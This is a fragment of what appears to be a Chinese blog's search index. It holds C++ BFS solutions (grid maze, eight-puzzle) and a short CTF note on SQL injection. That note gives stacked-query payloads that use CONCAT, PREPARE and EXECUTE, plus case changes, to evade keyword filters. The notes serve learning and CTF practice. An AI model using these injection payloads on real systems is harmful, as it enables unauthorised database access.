cin&gt;&gt;a[i][j];<br>        &#125;<br>    &#125;<br>    queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;q;<br>    q.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;);<span class="hljs-comment">//放入起点</span><br>    <span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-built_in">sizeof</span>(dis));<br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> [x,y] = q.<span class="hljs-built_in">front</span>();<span class="hljs-comment">//弹出要搜索的点</span><br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<span class="hljs-comment">//对四个方向进行搜索</span><br>        &#123;<br>                <span class="hljs-type">int</span> nx =x+dx[i];<br>                <span class="hljs-type">int</span> ny =y+dy[i];<br>                <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span> &amp;&amp; ny&lt;m &amp;&amp; a[nx][ny]==<span class="hljs-number">0</span> &amp;&amp; dis[nx][ny]==<span class="hljs-number">-1</span>)<span class="hljs-comment">//判断是否越界，为墙，还没有搜索过</span><br>                &#123;<br>                    q.<span class="hljs-built_in">push</span>(&#123;nx,ny&#125;);<span class="hljs-comment">//放入队列，等待搜索</span><br>                    dis[nx][ny] = dis[x][y]+<span class="hljs-number">1</span>;<span class="hljs-comment">//更新距离。</span><br>                &#125;<br>        &#125;   <br>    &#125;<br>    cout&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>八数码<br><a href="https://www.acwing.com/problem/content/847/">https://www.acwing.com/problem/content/847/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>unordered_map&lt;string,<span class="hljs-type">int</span>&gt;d;<span class="hljs-comment">//映射字符串状态到输入状态的距离</span><br>queue&lt;string&gt;q;<span class="hljs-comment">//搜索的队列</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<span class="hljs-comment">//搜索方向</span><br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">(string start)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//cout&lt;&lt;1&lt;&lt;endl;</span><br>    q.<span class="hljs-built_in">push</span>(start);<span class="hljs-comment">//将开始的搜索状态放入。</span><br>    d[start]=<span class="hljs-number">0</span>;<br>    string endstate = <span class="hljs-string">&quot;12345678x&quot;</span>;<span class="hljs-comment">//最终的搜索状态</span><br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        string t= q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> dis =d[t];<br>        <span class="hljs-keyword">if</span>(t==endstate) <span class="hljs-comment">//如果搜索到了最终状态，返回距离</span><br>        &#123;<br>            <span class="hljs-keyword">return</span>  dis;<br>        &#125;<br>        <span class="hljs-type">int</span> k = t.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<span class="hljs-comment">//找到x的位置</span><br>        <span class="hljs-type">int</span> x = k/<span class="hljs-number">3</span>;<span class="hljs-comment">//转移到2维上</span><br>        <span class="hljs-type">int</span> y = k%<span class="hljs-number">3</span>;<span class="hljs-comment">//转移到2维上</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<span class="hljs-comment">//在二维上进行搜索</span><br>        &#123;<br>            <span class="hljs-type">int</span> nx = x+dx[i];<br>            <span class="hljs-type">int</span> ny = y+dy[i];<br>            <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;<span class="hljs-number">3</span> &amp;&amp; ny&gt;=<span class="hljs-number">0</span> &amp;&amp; ny&lt;<span class="hljs-number">3</span>)<span class="hljs-comment">//判断是否越界</span><br>            &#123;<br>                <span class="hljs-built_in">swap</span>(t[k],t[<span class="hljs-number">3</span>*nx+ny]);<span class="hljs-comment">//向下一个状态进行移动</span><br>                <span class="hljs-keyword">if</span>(!d.<span class="hljs-built_in">count</span>(t))<span class="hljs-comment">//如果还没有搜索到</span><br>                &#123;<br>                    d[t] =dis+<span class="hljs-number">1</span>;<span class="hljs-comment">//更新距离</span><br>                    q.<span class="hljs-built_in">push</span>(t);<span class="hljs-comment">//进行下一步搜索</span><br>                &#125;<br>                <span class="hljs-built_in">swap</span>(t[<span class="hljs-number">3</span>*nx+ny],t[k]);<span class="hljs-comment">//回溯。</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    string start;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">9</span>;i++)<br>    &#123;<br>        <span class="hljs-type">char</span> c;<br>        cin&gt;&gt;c;<br>        start+=c;<br>    &#125;<br>    <span class="hljs-comment">//cout&lt;&lt;&quot;start:&quot;&lt;&lt;start&lt;&lt;endl;</span><br>    cout&lt;&lt;<span class="hljs-built_in">bfs</span>(start)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2020/03/11/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/03/11/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>常用的注入，有联合注入与堆叠注入。<br>联合注入即为 1’ or 1 union 注入语句#<br>堆叠注入即为 1’ or 1；注入语句#<br>注入中的预编译方法：<br>set是设置一个新列<br>prepare是进行定义一个语句<br>execute是执行<br>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@sql</span> <span class="hljs-operator">=</span> CONCAT(<span class="hljs-string">&#x27;se&#x27;</span>,<span class="hljs-string">&#x27;lect * from `1919810931114514`;&#x27;</span>);<span class="hljs-keyword">prepare</span> stmt <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>;<span class="hljs-keyword">EXECUTE</span> stmt;<br></code></pre></td></tr></table></figure><p>若遇到区分大小写等，如这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sEt</span> <span class="hljs-variable">@sql</span> <span class="hljs-operator">=</span> CONCAT(<span class="hljs-string">&#x27;se&#x27;</span>,<span class="hljs-string">&#x27;lect * from `1919810931114514`;&#x27;</span>);<span class="hljs-keyword">prEpare</span> stmt <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>;<span class="hljs-keyword">EXECUTE</span> stmt;#<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
